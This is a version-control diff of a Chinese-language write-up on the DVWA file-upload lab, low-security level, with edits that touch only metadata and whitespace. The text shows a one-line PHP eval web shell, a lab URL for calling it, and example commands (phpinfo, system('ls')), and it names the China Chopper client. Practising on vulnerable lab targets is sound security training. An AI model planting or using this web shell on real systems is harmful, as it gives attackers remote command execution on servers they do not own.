@@ -7,9 +7,8 @@ author: Kyon-H
 header-img: img/post-bg-2015.jpg
 tags:
   - DVWA
-categories: 
-excerpt: "文件上传漏洞 LOW MEDIUM HIGH"
 published: true
+category: 靶场实战
 ---
 # 文件上传漏洞
 ### LOW
@@ -17,14 +16,14 @@ published: true
 the.php
 
 ```php
-<?php eval($_GET['bckdor'])?>
+<?php eval($_GET['bckdor'])?> 
 ```
 
-构造url：http://192.168.30.131/dvwa/hackable/uploads/the.php?bckdor=
+构造url: http://192.168.30.131/dvwa/hackable/uploads/the.php?bckdor=
 
 ```php
-phpinfo();
-system('ls');
+phpinfo(); 
+system('ls'); 
 ```
 
 **中国菜刀**
